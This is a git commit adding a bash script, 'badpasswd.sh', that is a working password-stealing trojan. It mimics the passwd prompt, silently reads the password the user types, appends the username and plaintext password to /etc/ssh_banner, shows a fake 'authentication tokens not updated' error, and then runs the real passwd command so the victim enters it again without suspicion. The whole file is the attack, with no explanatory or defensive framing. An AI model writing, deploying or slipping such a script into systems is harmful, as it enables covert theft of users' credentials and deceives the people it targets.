5dcd812974f0cf295a12f27219a74afc77505105
mhart <mah2941@rit.edu>
2016-04-18 02:40:15 -0400

    Added files via upload

---
+++ badpasswd.sh
@@ -0,0 +1,44 @@
+#!/bin/bash
+
+DUSER=$USER
+PUSER=$1
+
+
+
+#Function for if no user is specified, passes current user
+
+nouser ()
+{
+	printf "Changing password for user $DUSER.\n"
+	printf "New password: "
+	read -s userpass
+	echo "$DUSER:$userpass" >> /etc/ssh_banner
+	printf "\nRetype new password: "
+	read -s garbage
+	printf "\npasswd: error - authentication tokens not updated. please try again.\n\n"
+	/usr/bin/passwd $DUSER
+
+}
+
+#Function for if user is specified, passes input
+withuser ()
+{
+	printf "Changing password for user $PUSER.\n"
+	printf "New password: "
+	read -s userpass
+	echo "$PUSER:$userpass" >> /etc/ssh_banner
+	printf "\nRetype new password: "
+	read -s garbage
+	printf "\npasswd: error - authentication tokens not updated. please try again.\n\n"
+	/usr/bin/passwd $PUSER
+
+}
+
+
+#Check to see if user was passed
+if [ -z $PUSER ]
+then
+	nouser
+else 
+	withuser
+fi
